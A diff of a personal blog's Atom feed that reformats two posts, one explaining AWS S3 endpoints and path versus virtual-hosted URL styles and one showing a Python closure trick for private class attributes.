@@ -1,27 +1,27 @@
 <?xml version="1.0" encoding="utf-8"?>
-<feed xmlns="http://www.w3.org/2005/Atom"><title>Oleg's Web Log</title><link href="http://www.wryway.com/" rel="alternate"></link><link href="http://www.wryway.com/feeds/all.atom.xml" rel="self"></link><id>http://www.wryway.com/</id><updated>2016-02-23T15:00:00-05:00</updated><entry><title>AWS S3 URL Styles</title><link href="http://www.wryway.com/blog/aws-s3-url-styles/" rel="alternate"></link><updated>2016-02-23T15:00:00-05:00</updated><author><name>Oleg Mitrofanov</name></author><id>tag:www.wryway.com,2016-02-23:blog/aws-s3-url-styles/</id><summary type="html">&lt;h1&gt;S3 endpoints&lt;/h1&gt;
+<feed xmlns="http://www.w3.org/2005/Atom"><title>Oleg's Web Log</title><link href="http://www.wryway.com/" rel="alternate"></link><link href="http://www.wryway.com/feeds/all.atom.xml" rel="self"></link><id>http://www.wryway.com/</id><updated>2016-02-23T15:00:00-05:00</updated><entry><title>AWS S3 URL Styles</title><link href="http://www.wryway.com/blog/aws-s3-url-styles/" rel="alternate"></link><published>2016-02-23T15:00:00-05:00</published><updated>2016-02-23T15:00:00-05:00</updated><author><name>Oleg Mitrofanov</name></author><id>tag:www.wryway.com,2016-02-23:/blog/aws-s3-url-styles/</id><summary type="html">&lt;p&gt;Description of AWS S3 URL schemes&lt;/p&gt;</summary><content type="html">&lt;h1&gt;S3 endpoints&lt;/h1&gt;
 &lt;p&gt;Before describing S3 bucket URL schemes, one thing that causes a lot of the confusion needs to be clarified. And that thing is S3 endpoint. &lt;/p&gt;
 &lt;p&gt;&lt;strong&gt;S3 endpoint&lt;/strong&gt; is a &lt;em&gt;region-specific&lt;/em&gt; URL that is used in both S3 URL styles (more on styles below). Follow the link to see the &lt;a href="http://docs.aws.amazon.com/general/latest/gr/rande.html#s3_region"&gt;list of all S3 endpoints&lt;/a&gt;. &lt;/p&gt;
 &lt;p&gt;Most of the endpoints follow this pattern (with region names being eu-west-1, us-west-2, etc):&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;    s3-REGION.amazonaws.com
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;    s3-REGION.amazonaws.com
 &lt;/pre&gt;&lt;/div&gt;
 
 
 &lt;p&gt;Examples:&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;    s3-eu-west-1.amazonaws.com
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;    s3-eu-west-1.amazonaws.com
     s3-us-west-2.amazonaws.com
 &lt;/pre&gt;&lt;/div&gt;
 
 
 &lt;p&gt;But there are a few quirks to the general naming scheme. &lt;/p&gt;
 &lt;p&gt;The first two outstanding endpoints that do not follow the above pattern are those of the &lt;em&gt;us-east-1&lt;/em&gt; (N. Virginia, also called US Standard) region. For that region endpoints are (they are synonyms and both point to the same place):&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;    s3.amazonaws.com
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;    s3.amazonaws.com
     s3-external-1.amazonaws.com
 &lt;/pre&gt;&lt;/div&gt;
 
 
 &lt;p&gt;The other quirk is that &lt;em&gt;eu-central-1&lt;/em&gt; (Frankfurt) and &lt;em&gt;ap-northeast-2&lt;/em&gt; (Seoul) regions both have one endpoint that follows the general pattern and one alias endpoint that differs from the general scheme in one symbol (first dash is replaced by dot): &lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;    s3-eu-central-1.amazonaws.com
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;    s3-eu-central-1.amazonaws.com
     s3.eu-central-1.amazonaws.com
 
     s3-ap-northeast-2.amazonaws.com
@@ -33,52 +33,52 @@
 &lt;p&gt;Now, after comprehending S3 endpoints, understanding of S3 bucket URL styles should be a breeze. According to &lt;a href="https://aws.amazon.com/documentation/s3/"&gt;S3 Developer Guide (PDF, p.57)&lt;/a&gt;, S3 supports both virtual-hosted and path URL styles for bucket access.&lt;/p&gt;
 &lt;h2&gt;Path style URL&lt;/h2&gt;
 &lt;p&gt;In path style URL bucket name is appended to the domain name and is a part of URL path:&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;    http://s3endpoint/BUCKET
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;    http://s3endpoint/BUCKET
 &lt;/pre&gt;&lt;/div&gt;
 
 
 &lt;p&gt;For example, if your store photo.jpg into images bucket residing in the us-west-2 region, you could access that file with &lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;    http://s3-us-west-2.amazonaws.com/images/photo.jpg
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;    http://s3-us-west-2.amazonaws.com/images/photo.jpg
 &lt;/pre&gt;&lt;/div&gt;
 
 
 &lt;p&gt;To access the file from bucket located in eu-central-1 region, you could use either of the following URLs:&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;    http://s3-eu-central-1.amazonaws.com/images/photo.jpg
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;    http://s3-eu-central-1.amazonaws.com/images/photo.jpg
     http://s3.eu-central-1.amazonaws.com/images/photo.jpg
 &lt;/pre&gt;&lt;/div&gt;
 
 
 &lt;p&gt;And to access the file from bucket residing in us-east-1 region, you would have to use either of the following two URLs:&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;    http://s3.amazonaws.com/images/photo.jpg
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;    http://s3.amazonaws.com/images/photo.jpg
     http://s3-external-1.amazonaws.com/images/photo.jpg
 &lt;/pre&gt;&lt;/div&gt;
 
 
 &lt;h2&gt;Virtual-hosted style URL&lt;/h2&gt;
 &lt;p&gt;In virtual-hosted style URL the bucket name becomes a subdomain:&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;    http://BUCKET.s3endpoint
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;    http://BUCKET.s3endpoint
 &lt;/pre&gt;&lt;/div&gt;
 
 
 &lt;p&gt;To access photo.jpg file stored in images bucket that resides in the us-west-2 region, you would use the following URL:&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;    http://images.s3-us-west-2.amazonaws.com/photo.jpg
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;    http://images.s3-us-west-2.amazonaws.com/photo.jpg
 &lt;/pre&gt;&lt;/div&gt;
 
 
 &lt;p&gt;To access the file from bucket located in eu-central-1 region, you could use either of the following URLs:&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;    http://images.s3-eu-central-1.amazonaws.com/photo.jpg
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;    http://images.s3-eu-central-1.amazonaws.com/photo.jpg
     http://images.s3.eu-central-1.amazonaws.com/photo.jpg
 &lt;/pre&gt;&lt;/div&gt;
 
 
 &lt;p&gt;And to access the file from bucket registered in us-east-1 region, you would have to use either of the following two URLs:&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;    http://images.s3.amazonaws.com/photo.jpg
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;    http://images.s3.amazonaws.com/photo.jpg
     http://images.s3-external-1.amazonaws.com/photo.jpg
 &lt;/pre&gt;&lt;/div&gt;
 
 
 &lt;p&gt;Note, however, one important thing. With virtual-hosted style you can additionally use s3.amazonaws.com endpoint for any bucket residing in ANY region. Because bucket name is part of the domain name, AWS backend has sufficient information to correctly resolve or redirect (with 307 Temporary Redirect HTTP response code) your request to the region where the bucket resides. For example the following pairs of requests are equivalent:&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;    http://images.s3-us-west-2.amazonaws.com/photo.jpg
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;    http://images.s3-us-west-2.amazonaws.com/photo.jpg
     http://images.s3.amazonaws.com/photo.jpg
 
     http://gods.s3.eu-central-1.amazonaws.com/odin.jpg
@@ -90,33 +90,33 @@
 &lt;h2&gt;Static Website Hosting Endpoints&lt;/h2&gt;
 &lt;p&gt;Finally, note that if you use S3's &lt;em&gt;Static Website Hosting&lt;/em&gt; feature you will need to use &lt;em&gt;Website Endpoints&lt;/em&gt;. &lt;/p&gt;
 &lt;p&gt;There are two general forms of S3 website endpoint:&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;    http://BUCKET.s3-website-region.amazonaws.com
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;    http://BUCKET.s3-website-region.amazonaws.com
     http://BUCKET.s3-website.region.amazonaws.com
 &lt;/pre&gt;&lt;/div&gt;
 
 
-&lt;p&gt;Most of the regions follow the first form, while &lt;em&gt;eu-central-1&lt;/em&gt; and &lt;em&gt;ap-northeast-2&lt;/em&gt; follow the second. Follow the link for the &lt;a href="http://docs.aws.amazon.com/AmazonS3/latest/dev/WebsiteEndpoints.html#d0e27023"&gt;list of all S3 website endpoints&lt;/a&gt;.&lt;/p&gt;</summary><category term="AWS"></category><category term="S3"></category></entry><entry><title>Private attributes in Python</title><link href="http://www.wryway.com/blog/private-attributes-in-python/" rel="alternate"></link><updated>2016-01-23T14:00:00-05:00</updated><author><name>Oleg Mitrofanov</name></author><id>tag:www.wryway.com,2016-01-23:blog/private-attributes-in-python/</id><summary type="html">&lt;p&gt;Python does not natively support complete hiding of class attributes similar to that provided by the &lt;code&gt;private&lt;/code&gt; keyword in languages like C# or C++. The whole idea of hiding attributes goes against &lt;a href="http://stackoverflow.com/a/1641236/1027946"&gt;Python's philosophy of being responsible&lt;/a&gt; and avoiding messing with attributes marked as private or internal with an underscore prefix.&lt;/p&gt;
+&lt;p&gt;Most of the regions follow the first form, while &lt;em&gt;eu-central-1&lt;/em&gt; and &lt;em&gt;ap-northeast-2&lt;/em&gt; follow the second. Follow the link for the &lt;a href="http://docs.aws.amazon.com/AmazonS3/latest/dev/WebsiteEndpoints.html#d0e27023"&gt;list of all S3 website endpoints&lt;/a&gt;.&lt;/p&gt;</content><category term="AWS"></category><category term="S3"></category></entry><entry><title>Private attributes in Python</title><link href="http://www.wryway.com/blog/private-attributes-in-python/" rel="alternate"></link><published>2016-01-23T14:00:00-05:00</published><updated>2016-01-23T14:00:00-05:00</updated><author><name>Oleg Mitrofanov</name></author><id>tag:www.wryway.com,2016-01-23:/blog/private-attributes-in-python/</id><summary type="html">&lt;p&gt;Using private class attributes in Python&lt;/p&gt;</summary><content type="html">&lt;p&gt;Python does not natively support complete hiding of class attributes similar to that provided by the &lt;code&gt;private&lt;/code&gt; keyword in languages like C# or C++. The whole idea of hiding attributes goes against &lt;a href="http://stackoverflow.com/a/1641236/1027946"&gt;Python's philosophy of being responsible&lt;/a&gt; and avoiding messing with attributes marked as private or internal with an underscore prefix.&lt;/p&gt;
 &lt;p&gt;Python trusts you to stay away from attributes that begin with an underscore and even provides a limited support for attribute hiding for attributes whose name start with two underscores.&lt;/p&gt;
 &lt;p&gt;Attribute names starting with double underscore are mangled into some not-so-readable names so that you can't access them with the name they were referred to in the class definition (still, &lt;a href="https://docs.python.org/3/tutorial/classes.html#private-variables"&gt;Python documentation&lt;/a&gt; notes that it is there to avoid name clashes with names defined by subclasses, not for hiding). But knowing standard mangling rules it is still possible to access those attributes with mangled names:&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="k"&gt;class&lt;/span&gt; &lt;span class="nc"&gt;Person&lt;/span&gt;&lt;span class="p"&gt;():&lt;/span&gt;
-     &lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;__init__&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;age&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="k"&gt;class&lt;/span&gt; &lt;span class="nc"&gt;Person&lt;/span&gt;&lt;span class="p"&gt;():&lt;/span&gt;
+     &lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="fm"&gt;__init__&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;age&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
              &lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;__age&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;age&lt;/span&gt;
      &lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;getAge&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
              &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;__age&lt;/span&gt;
 
 &lt;span class="n"&gt;p&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;Person&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;20&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
-&lt;span class="n"&gt;p&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;getAge&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;     &lt;span class="c"&gt;# =&amp;gt; 20&lt;/span&gt;
-&lt;span class="n"&gt;p&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;__age&lt;/span&gt;        &lt;span class="c"&gt;# =&amp;gt; AttributeError: &amp;#39;Person&amp;#39; object has no attribute &amp;#39;__age&amp;#39;   &lt;/span&gt;
-&lt;span class="nb"&gt;dir&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;p&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;         &lt;span class="c"&gt;# =&amp;gt; [&amp;#39;_Person__age&amp;#39;, ...] &amp;lt;= Peeking the mangled name&lt;/span&gt;
-&lt;span class="n"&gt;p&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;_Person__age&lt;/span&gt; &lt;span class="c"&gt;# =&amp;gt; 20&lt;/span&gt;
+&lt;span class="n"&gt;p&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;getAge&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;     &lt;span class="c1"&gt;# =&amp;gt; 20&lt;/span&gt;
+&lt;span class="n"&gt;p&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;__age&lt;/span&gt;        &lt;span class="c1"&gt;# =&amp;gt; AttributeError: &amp;#39;Person&amp;#39; object has no attribute &amp;#39;__age&amp;#39;   &lt;/span&gt;
+&lt;span class="nb"&gt;dir&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;p&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;         &lt;span class="c1"&gt;# =&amp;gt; [&amp;#39;_Person__age&amp;#39;, ...] &amp;lt;= Peeking the mangled name&lt;/span&gt;
+&lt;span class="n"&gt;p&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;_Person__age&lt;/span&gt; &lt;span class="c1"&gt;# =&amp;gt; 20&lt;/span&gt;
 &lt;/pre&gt;&lt;/div&gt;
 
 
 &lt;p&gt;With the above said there is at least one way to create private attributes completely inaccessible from outside. And, as you might have guessed, it goes against Python's best practices.&lt;/p&gt;
 &lt;p&gt;The approach I describe below was gleaned from a wonderful book by Nicholas C. Zakas &lt;a href="http://amzn.com/1593275404"&gt;The Principles of Object-Oriented JavaScript&lt;/a&gt;. Yes, many patterns stay the same across different programming languages =). In the book the author leverages what in JavaScript is called &lt;em&gt;immediately invoked function expression (IIFE)&lt;/em&gt; and closures.&lt;/p&gt;
 &lt;p&gt;Consider the following Python class declaration:&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="k"&gt;class&lt;/span&gt; &lt;span class="nc"&gt;Person&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
-    &lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;__init__&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;age&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="k"&gt;class&lt;/span&gt; &lt;span class="nc"&gt;Person&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
+    &lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="fm"&gt;__init__&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;age&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
         &lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;age&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;age&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
 
     &lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;growOlder&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
@@ -129,11 +129,11 @@
 
 &lt;p&gt;As it is now, it will be possible to directly read and modify the &lt;code&gt;age&lt;/code&gt; attribute on a class instance. But let's assume that you want to conceal the age attribute so that it can only be read with &lt;code&gt;getAge()&lt;/code&gt; method, or incremented with &lt;code&gt;growOlder()&lt;/code&gt; method.&lt;/p&gt;
 &lt;p&gt;The whole trick can be achieved by moving class definition inside of a function, declaring class "private" attributes as function local variables and returning a new instance of the class as a result of the function:&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;Person&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;age&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;Person&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;age&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
     &lt;span class="n"&gt;_age&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;];&lt;/span&gt;
 
     &lt;span class="k"&gt;class&lt;/span&gt; &lt;span class="nc"&gt;Person&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
-        &lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;__init__&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;age&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
+        &lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="fm"&gt;__init__&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;age&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
             &lt;span class="n"&gt;_age&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;age&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
 
         &lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;growOlder&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
@@ -147,11 +147,11 @@
 
 
 &lt;p&gt;You can then use the above function as a class constructor:&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="n"&gt;p1&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;Person&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;10&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
-&lt;span class="n"&gt;p1&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;getAge&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;    &lt;span class="c"&gt;# =&amp;gt; 10&lt;/span&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="n"&gt;p1&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;Person&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;10&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+&lt;span class="n"&gt;p1&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;getAge&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;    &lt;span class="c1"&gt;# =&amp;gt; 10&lt;/span&gt;
 &lt;span class="n"&gt;p1&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;growOlder&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
-&lt;span class="n"&gt;p1&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;getAge&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;    &lt;span class="c"&gt;# =&amp;gt; 11&lt;/span&gt;
-&lt;span class="n"&gt;p1&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;_age&lt;/span&gt;        &lt;span class="c"&gt;# =&amp;gt; AttributeError: &amp;#39;Person&amp;#39; object has no attribute &amp;#39;_age&amp;#39;&lt;/span&gt;
+&lt;span class="n"&gt;p1&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;getAge&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;    &lt;span class="c1"&gt;# =&amp;gt; 11&lt;/span&gt;
+&lt;span class="n"&gt;p1&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;_age&lt;/span&gt;        &lt;span class="c1"&gt;# =&amp;gt; AttributeError: &amp;#39;Person&amp;#39; object has no attribute &amp;#39;_age&amp;#39;&lt;/span&gt;
 &lt;/pre&gt;&lt;/div&gt;
 
 
@@ -159,11 +159,11 @@
 &lt;p&gt;Note that Python list was used to hold the private attribute. This is because of how scoping rules in Python work. In Python, you can read an immutable variable defined in an outer scope, but an attempt to assign a new value to it will result in creation of a new variable in the current scope. To overcome this issue one has to use mutable objects, of which the list is one. &lt;/p&gt;
 &lt;p&gt;One another mutable object usable for this purpose is dictionary. You could define your private attributes as elements of a local dictionary variable (e.g. &lt;code&gt;private = {"age":  0}&lt;/code&gt;) and then access them through the class definition (e.g. &lt;code&gt;private["age"] = private["age"] + 1&lt;/code&gt;).&lt;/p&gt;
 &lt;p&gt;My favorite way though is to define an empty class (which is a reference mutable type) and then use it as private attributes holder:&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;Person&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;age&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;Person&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;age&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
     &lt;span class="k"&gt;class&lt;/span&gt; &lt;span class="nc"&gt;_&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="k"&gt;pass&lt;/span&gt;
 
     &lt;span class="k"&gt;class&lt;/span&gt; &lt;span class="nc"&gt;Person&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
-        &lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;__init__&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;age&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
+        &lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="fm"&gt;__init__&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;age&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
             &lt;span class="n"&gt;_&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;age&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;age&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
 
         &lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;growOlder&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
@@ -177,13 +177,13 @@
 
 
 &lt;p&gt;And one more variation on the theme that uses the &lt;code&gt;nonlocal&lt;/code&gt; keyword to write to outer scope immutable variables. It is a bit verbose and only works for Python 3:&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="c"&gt;# Python 3 only&lt;/span&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="c1"&gt;# Python 3 only&lt;/span&gt;
 &lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;Person&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;age&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
     &lt;span class="n"&gt;_age&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
 
     &lt;span class="k"&gt;class&lt;/span&gt; &lt;span class="nc"&gt;Person&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
 
-        &lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;__init__&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;age&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
+        &lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="fm"&gt;__init__&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;age&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
             &lt;span class="n"&gt;nonlocal&lt;/span&gt; &lt;span class="n"&gt;_age&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
             &lt;span class="n"&gt;_age&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;age&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
 
@@ -196,11 +196,11 @@
             &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="n"&gt;_age&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
 
     &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="n"&gt;Person&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;age&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
